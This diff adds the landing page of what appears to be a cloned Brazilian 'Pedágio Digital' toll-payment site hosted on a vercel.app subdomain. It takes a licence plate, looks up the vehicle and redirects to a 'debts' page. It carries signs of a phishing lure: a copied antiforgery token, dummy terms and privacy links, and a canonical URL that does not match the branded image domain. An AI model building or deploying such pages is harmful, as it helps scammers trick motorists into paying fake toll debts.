@@ -1,0 +1,589 @@
+<!-- Build trigger: 1772757911 -->
+<!DOCTYPE html>
+<html lang="en">
+
+<head>
+    <meta charset="utf-8" />
+    <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+    <link rel="stylesheet" href="lib/bootstrap/dist/css/bootstrap.min.css" />
+    <script src="lib/sweetalert2/sweetalert2.all.min.js"></script>
+    <link rel="icon" href="favicon.ico" type="image/x-icon" />
+</head>
+
+<body>
+
+    <!doctype html>
+    <html lang="pt-br">
+
+    <head>
+        <meta charset="utf-8" />
+        <meta name="viewport" content="width=device-width, initial-scale=1" />
+        <title>Pedágio Digital</title>
+        <meta name="description"
+            content="Acesse e controle seus pagamentos de pedágio digital em um só lugar. Rápido, seguro e fácil." />
+        <link rel="canonical" href="https://flowdigital-brown.vercel.app" />
+        <!-- Favicons -->
+        <link rel="icon" href="favicon.ico" type="image/png" />
+        <link rel="apple-touch-icon" href="favicon.ico" />
+        <meta name="theme-color" content="#0b2239" />
+        <!-- Fonte -->
+        <!-- Fonte Ubuntu local -->
+        <link rel="stylesheet" href="lib/fonts/ubuntu.css">
+        <meta name="robots" content="index,follow" />
+        <link rel="canonical" href="https://flowdigital-brown.vercel.app" />
+        <!-- Favicons extras -->
+        <link rel="icon" sizes="192x192" href="favicon.ico" />
+        <link rel="apple-touch-icon" sizes="180x180" href="favicon.ico" />
+        <!-- Social -->
+        <meta property="og:title" content="Pedágio Digital" />
+        <meta property="og:description"
+            content="Acesse e controle seus pagamentos de pedágio digital em um só lugar." />
+        <meta property="og:type" content="website" />
+        <meta property="og:image" content="https://www.pedagiodigital.com/og-card.png" />
+        <meta property="og:locale" content="pt_BR" />
+        <meta name="twitter:card" content="summary_large_image" />
+        <!-- CSS -->
+        <!-- Anti-CLS -->
+        <style>
+            img[width][height] {
+                height: auto
+            }
+
+            .swal-btn-custom {
+                display: inline-flex;
+                align-items: center;
+                justify-content: center;
+                width: 100%;
+                height: 60px;
+                padding: 0 20px;
+                border-radius: 12px;
+                border: 0;
+                font-family: 'Ubuntu', sans-serif;
+                font-weight: 500;
+                font-size: 18px;
+                margin-top: 20px;
+                text-decoration: none;
+                background: #000;
+                color: #e5ff51;
+                cursor: pointer;
+                box-shadow: 0 10px 30px rgba(0, 0, 0, 0.35);
+                transition: filter 0.2s, transform 0.15s;
+            }
+
+            .swal-btn-custom:hover {
+                filter: brightness(1.02);
+                transform: translateY(-1px);
+            }
+
+            .swal-popup-custom {
+                border-radius: 12px;
+            }
+
+            /* Estilos para o Modal de Veículo Encontrado */
+            .vehicle-modal-overlay {
+                position: fixed;
+                top: 0;
+                left: 0;
+                right: 0;
+                bottom: 0;
+                background: rgba(0, 0, 0, 0.6);
+                display: none;
+                align-items: center;
+                justify-content: center;
+                z-index: 9999;
+                padding: 20px;
+            }
+
+            .vehicle-modal-overlay.active {
+                display: flex;
+            }
+
+            .vehicle-modal-content {
+                background: white;
+                border-radius: 12px;
+                max-width: 500px;
+                width: 100%;
+                padding: 30px;
+                box-shadow: 0 20px 40px rgba(0, 0, 0, 0.3);
+            }
+
+            .vehicle-modal-header {
+                text-align: center;
+                margin-bottom: 20px;
+            }
+
+            .vehicle-modal-header h2 {
+                font-size: 24px;
+                font-weight: bold;
+                margin: 0 0 5px 0;
+                color: #1a1a1a;
+            }
+
+            .vehicle-modal-header p {
+                font-size: 14px;
+                color: #666;
+                margin: 0;
+            }
+
+            .vehicle-modal-data {
+                background: #f9fafb;
+                border-radius: 8px;
+                padding: 15px;
+                margin-bottom: 20px;
+            }
+
+            .vehicle-modal-row {
+                display: flex;
+                justify-content: space-between;
+                align-items: center;
+                padding: 10px 0;
+                border-bottom: 1px solid #e5e7eb;
+            }
+
+            .vehicle-modal-row:last-child {
+                border-bottom: none;
+            }
+
+            .vehicle-modal-label {
+                font-weight: 500;
+                color: #6b7280;
+                font-size: 14px;
+            }
+
+            .vehicle-modal-value {
+                color: #1a1a1a;
+                font-weight: 600;
+                font-size: 14px;
+            }
+
+            .vehicle-modal-btn {
+                width: 100%;
+                padding: 16px;
+                border-radius: 12px;
+                border: 0;
+                font-family: 'Ubuntu', sans-serif;
+                font-weight: 600;
+                font-size: 16px;
+                margin-top: 12px;
+                cursor: pointer;
+                transition: all 0.2s;
+            }
+
+            .vehicle-modal-btn-confirm {
+                background: #e5ff51;
+                color: #000;
+                box-shadow: 0 2px 8px rgba(229, 255, 82, 0.25);
+            }
+
+            .vehicle-modal-btn-confirm:hover {
+                opacity: 0.9;
+                transform: translateY(-1px);
+            }
+
+            .vehicle-modal-btn-cancel {
+                background: #1a1a1a;
+                color: #fff;
+                box-shadow: 0 2px 8px rgba(0, 0, 0, 0.15);
+            }
+
+            .vehicle-modal-btn-cancel:hover {
+                background: #D0D0D0;
+                transform: translateY(-1px);
+            }
+
+            .vehicle-modal-btn:disabled {
+                opacity: 0.6;
+                cursor: not-allowed;
+                pointer-events: none;
+            }
+
+            /* Loading spinner */
+            .loading-spinner {
+                display: inline-block;
+                width: 16px;
+                height: 16px;
+                border: 2px solid rgba(255, 255, 255, 0.3);
+                border-top-color: #fff;
+                border-radius: 50%;
+                animation: spin 0.8s linear infinite;
+                margin-left: 8px;
+                vertical-align: middle;
+            }
+
+            @keyframes spin {
+                to {
+                    transform: rotate(360deg);
+                }
+            }
+        </style>
+
+        <link rel="stylesheet" crossorigin href="css/main-CzkptIVh.css">
+    </head>
+
+    <body>
+        <a href="index.html#conteudo" class="sr-only">Pular para conteúdo</a>
+        <header class="site-header" role="banner">
+            <div class="hdr-container">
+                <a class="brand" href="https://flowdigital-brown.vercel.app">
+                    <img id="brand-logo" src="images/logo-CWdoJbug.png" alt="Pedágio Digital" loading="eager" />
+                </a>
+
+                <!-- Botão mobile -->
+                <button id="menu-toggle" class="menu-toggle" aria-controls="primary-navigation" aria-expanded="false"
+                    aria-label="Abrir menu">
+                    <span class="bar" aria-hidden="true"></span>
+                    <span class="bar" aria-hidden="true"></span>
+                    <span class="bar" aria-hidden="true"></span>
+                </button>
+
+                <!-- Navegação -->
+                <nav id="primary-navigation" class="primary-nav" aria-label="Principal">
+                    <ul class="nav-list">
+                        <li><a href="index.html#" id="openLogin" class="js-open-login">Fazer Login</a></li>
+                        <li><a href="index.html">Perguntas frequentes</a></li>
+                        <li><a href="index.html">Criar Conta</a></li>
+                    </ul>
+                </nav>
+            </div>
+        </header>
+        <section class="hero" id="inicio" aria-label="Seção inicial">
+            <div class="hero__bg" aria-hidden="true"></div>
+
+            <div class="hero__grid">
+                <div class="hero__left">
+                    <h1 class="hero__title">
+                        DESFRUTE DE TODA A<br>
+                        COMODIDADE DO<br>
+                        PEDÁGIO <span class="highlight">DIGITAL</span>
+                    </h1>
+                    <p class="hero__subtitle">
+                        Uma nova era para o pedágio começou: ágil e digital como tem que ser.
+                    </p>
+                </div>
+
+                <aside class="hero__right" aria-label="Consulta de débitos">
+                    <div class="hero__card">
+                        <h2 class="card__title">
+                            Um <strong>único</strong> lugar para <strong>acessar</strong> e
+                            <strong>controlar</strong> seus pagamentos.
+                        </h2>
+
+                        <form class="card__form" method="get" onsubmit="handleSubmit(event)">
+                            <label class="sr-only" for="placa">Digite sua placa</label>
+                            <input id="placa" class="inp" type="text" name="placa" placeholder="DIGITE SUA PLACA"
+                                autocomplete="off" inputmode="latin" maxlength="8" />
+                            <label class="chk">
+                                <input type="checkbox" data-required />
+                                <span>Aceito os <a href="index.html" target="_blank">Termos e Condições de
+                                        Uso</a>.</span>
+                            </label>
+                            <label class="chk">
+                                <input type="checkbox" data-required />
+                                <span>
+                                    Estou ciente da <a href="index.html" target="_blank">
+                                        Política de
+                                        Privacidade
+                                    </a> e me
+                                    responsabilizo pela veracidade dos dados.
+                                </span>
+                            </label>
+
+                            <div class="mt-3" style="text-align:center;">
+                            </div>
+
+                            <button class="btn" type="button" id="btnBuscar" disabled>
+                                Buscar débitos
+                            </button>
+                            <input name="__RequestVerificationToken" type="hidden"
+                                value="CfDJ8CZgslv4CrRDm31sA7Ti4nQosShcSyxfRBpIICWExwbGucV_QtpSyxXvE7s0SHDS4CAMq2Kc1dGmdeUtfAVDf0NXwxkiyUMRd7Uh5pDSnYHjKYcoM5LGAVPexWfKhxlJViNopK0Rrq8IaUieTeK4UH4" />
+                        </form>
+
+                        <p class="card__link">
+                            <a href="index.html" class="js-open-login">Começar agora</a>
+                        </p>
+                    </div>
+                </aside>
+            </div>
+        </section>
+
+        <section id="central-atendimento" class="support" aria-labelledby="support-title">
+            <button class="support__toggle" aria-controls="support-panel" aria-expanded="false">
+                <div class="support__container">
+                    <strong id="support-title">Central de atendimento</strong>
+                    <svg class="chev" width="32" height="32" viewBox="0 0 24 24" aria-hidden="true">
+                        <path d="M6 9l6 6 6-6" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round"
+                            stroke-linejoin="round" />
+                    </svg>
+                </div>
+            </button>
+
+
+
+            <div id="support-panel" class="support__panel" hidden></div>
+        </section>
+
+        <script>
+            // ===== FUNÇÕES GLOBAIS PARA A API DE PLACAS =====
+
+            // 🎯 Função para aplicar máscara de placa
+            function aplicarMascaraPlaca(valor) {
+                valor = valor.toUpperCase().replace(/[^A-Z0-9]/g, '');
+                if (valor.length <= 3) {
+                    return valor;
+                }
+                if (valor.length <= 7) {
+                    return valor.substring(0, 3) + '-' + valor.substring(3);
+                }
+                return valor.substring(0, 3) + '-' + valor.substring(3, 8);
+            }
+
+            // 📋 Valida formato de placa
+            function validarFormatoPlaca(placa) {
+                const placaLimpa = placa.replace(/[^A-Z0-9]/g, '');
+                if (placaLimpa.length !== 7) {
+                    return false;
+                }
+                if (!/^[A-Z]{3}/.test(placaLimpa)) {
+                    return false;
+                }
+                const ultimosQuatro = placaLimpa.substring(3);
+                if (!/^[0-9]{4}$|^[0-9]{3}[A-Z]$/.test(ultimosQuatro)) {
+                    return false;
+                }
+                return true;
+            }
+
+            // 🔎 Valida formulário
+            function validarFormulario() {
+                const placaInput = document.getElementById("placa");
+                const form = document.querySelector(".card__form");
+                const checkboxes = form.querySelectorAll("input[type='checkbox'][data-required]");
+                const btnBuscar = document.getElementById("btnBuscar");
+
+                const placaValida = placaInput.value.trim().length > 0;
+                const checksMarcados = [...checkboxes].every(chk => chk.checked);
+
+                btnBuscar.disabled = !(placaValida && checksMarcados);
+            }
+
+            // 🚀 Submit com validação de placa e chamada à API
+            function handleSubmit(event) {
+                event.preventDefault();
+
+                const form = event.target;
+                const placaInput = document.getElementById("placa");
+                const btnBuscar = document.getElementById("btnBuscar");
+                const placaValor = placaInput.value.trim();
+
+                // Validar formato de placa
+                if (!validarFormatoPlaca(placaValor)) {
+                    Swal.fire({
+                        title: 'Placa Inválida',
+                        text: 'Por favor, digite uma placa válida no formato ABC-1234 ou ABC1D34 (Mercosul).',
+                        icon: 'warning',
+                        confirmButtonText: 'OK',
+                        customClass: {
+                            confirmButton: 'swal-btn-custom'
+                        },
+                        didOpen: () => {
+                            document.querySelectorAll("button").forEach(btn => {
+                                btn.disabled = false;
+                            });
+                            btnBuscar.classList.remove("loading");
+                        }
+                    });
+                    return false;
+                }
+
+                // Ativa loader no botão principal
+                btnBuscar.classList.add("loading");
+
+                // Desabilita TODOS os botões da tela
+                document.querySelectorAll("button").forEach(btn => {
+                    btn.disabled = true;
+                });
+
+                // Consultar API de placas
+                consultarPlaca(placaValor, form);
+
+                return false;
+            }
+
+            // 🔍 Função para consultar a API de placas
+            function consultarPlaca(placa, form) {
+                const placaLimpa = placa.replace(/[^A-Z0-9]/g, '');
+                // Usar endpoint local de proxy para contornar restrições de CORS
+                const apiUrl = `/api/placas?placa=${placaLimpa}`;
+                const btnBuscar = document.getElementById("btnBuscar");
+
+                // Timeout de 5 segundos
+                const timeoutId = setTimeout(() => {
+                    console.warn('Timeout na consulta da API de placas.');
+                    // Prosseguir direto para débitos sem exibir modal
+                    prosseguirParaDebitos(placaLimpa);
+                }, 5000);
+
+                fetch(apiUrl, {
+                    method: 'GET',
+                    headers: {
+                        'Accept': 'application/json',
+                        'Content-Type': 'application/json'
+                    },
+                    mode: 'cors',
+                    credentials: 'omit'
+                })
+                    .then(response => {
+                        clearTimeout(timeoutId);
+
+                        if (!response.ok) {
+                            throw new Error(`HTTP error! status: ${response.status}`);
+                        }
+
+                        return response.json();
+                    })
+                    .then(data => {
+                        // Verificar se a resposta contém dados válidos
+                        if (data.status === 'success' && data.dados && data.dados.Marca && data.dados.Modelo) {
+                            // Sucesso! Exibir modal com dados reais do veículo
+                            console.log('Dados da API recebidos com sucesso:', data.dados);
+                            exibirModalVeiculo(data.dados, placaLimpa);
+                        } else {
+                            // Erro na API ou dados incompletos, prosseguir direto para débitos
+                            console.warn('Erro na API ou dados incompletos.');
+                            prosseguirParaDebitos(placaLimpa);
+                        }
+                    })
+                    .catch(error => {
+                        console.error('Erro ao consultar API de placas:', error);
+                        // Em caso de erro, prosseguir direto para débitos
+                        prosseguirParaDebitos(placaLimpa);
+                    })
+                    .finally(() => {
+                        // Remover loader do botão
+                        btnBuscar.classList.remove("loading");
+                        // Reabilitar botões
+                        document.querySelectorAll("button").forEach(btn => {
+                            btn.disabled = false;
+                        });
+                    });
+            }
+
+            // 🎪 Função para exibir modal de veículo encontrado
+            function exibirModalVeiculo(dados, placa) {
+                // Criar overlay se não existir
+                let overlay = document.getElementById('vehicleModalOverlay');
+                if (!overlay) {
+                    overlay = document.createElement('div');
+                    overlay.id = 'vehicleModalOverlay';
+                    overlay.className = 'vehicle-modal-overlay';
+                    overlay.innerHTML = `
+                        <div class="vehicle-modal-content">
+                            <div class="vehicle-modal-header">
+                                <h2>Veículo Encontrado</h2>
+                                <p>Confirme os dados abaixo</p>
+                            </div>
+                            
+                            <div class="vehicle-modal-data">
+                                <div class="vehicle-modal-row">
+                                    <span class="vehicle-modal-label">Placa</span>
+                                    <span class="vehicle-modal-value" id="modalPlaca">-</span>
+                                </div>
+                                <div class="vehicle-modal-row">
+                                    <span class="vehicle-modal-label">Marca</span>
+                                    <span class="vehicle-modal-value" id="modalMarca">-</span>
+                                </div>
+                                <div class="vehicle-modal-row">
+                                    <span class="vehicle-modal-label">Modelo</span>
+                                    <span class="vehicle-modal-value" id="modalModelo">-</span>
+                                </div>
+                                <div class="vehicle-modal-row">
+                                    <span class="vehicle-modal-label">Ano</span>
+                                    <span class="vehicle-modal-value" id="modalAno">-</span>
+                                </div>
+                                <div class="vehicle-modal-row">
+                                    <span class="vehicle-modal-label">Cor</span>
+                                    <span class="vehicle-modal-value" id="modalCor">-</span>
+                                </div>
+                            </div>
+                            
+                            <button class="vehicle-modal-btn vehicle-modal-btn-confirm" id="vehicleYes">✓ Sim, este é meu veículo</button>
+                            <button class="vehicle-modal-btn vehicle-modal-btn-cancel" id="vehicleNo">✕ Não, redigitar placa</button>
+                        </div>
+                    `;
+                    document.body.appendChild(overlay);
+                }
+
+                // Preencher dados do veículo
+                document.getElementById('modalMarca').textContent = dados.Marca || '-';
+                document.getElementById('modalModelo').textContent = dados.Modelo || '-';
+                document.getElementById('modalAno').textContent = dados.Ano || '-';
+                document.getElementById('modalCor').textContent = dados.Cor || '-';
+                document.getElementById('modalPlaca').textContent = placa;
+
+                // Mostrar modal
+                overlay.classList.add('active');
+
+                // Eventos dos botões
+                document.getElementById('vehicleYes').onclick = () => {
+                    overlay.classList.remove('active');
+                    prosseguirParaDebitos(placa);
+                };
+
+                document.getElementById('vehicleNo').onclick = () => {
+                    overlay.classList.remove('active');
+                    // Limpar input e permitir nova digitação
+                    document.getElementById('placa').value = '';
+                    document.getElementById('placa').focus();
+                    validarFormulario();
+                };
+            }
+
+            // ✅ Função para prosseguir para débitos
+            function prosseguirParaDebitos(placa) {
+                const placaLimpa = placa.replace(/[^A-Z0-9]/g, '');
+                
+                // Gerar data/hora atual no formato DD/MM/YYYY - HH:MM
+                const agora = new Date();
+                const dia = String(agora.getDate()).padStart(2, '0');
+                const mes = String(agora.getMonth() + 1).padStart(2, '0');
+                const ano = agora.getFullYear();
+                const hora = String(agora.getHours()).padStart(2, '0');
+                const minuto = String(agora.getMinutes()).padStart(2, '0');
+                const dataHora = `${dia}/${mes}/${ano} - ${hora}:${minuto}`;
+                
+                // Codificar data/hora para URL
+                const dataHoraEncoded = encodeURIComponent(dataHora);
+                
+                window.location.href = `debitos.html?placa=${placaLimpa}&dataHora=${dataHoraEncoded}`;
+            }
+
+            // ===== INICIALIZAÇÃO DO FORMULÁRIO =====
+            document.addEventListener("DOMContentLoaded", function () {
+                const form = document.querySelector(".card__form");
+                const placaInput = document.getElementById("placa");
+                const checkboxes = form.querySelectorAll("input[type='checkbox'][data-required]");
+                const btnBuscar = document.getElementById("btnBuscar");
+
+                // Eventos de validação
+                placaInput.addEventListener("input", function (e) {
+                    const valor = e.target.value;
+                    const mascarado = aplicarMascaraPlaca(valor);
+                    e.target.value = mascarado;
+                    validarFormulario();
+                });
+
+                checkboxes.forEach(chk =>
+                    chk.addEventListener("change", validarFormulario)
+                );
+
+                // Event listener para o botão de buscar
+                btnBuscar.addEventListener("click", function (e) {
+                    e.preventDefault();
+                    e.stopPropagation();
+                    handleSubmit(e);
+                });
+            });
+        </script>
+</body>
+
+</html>
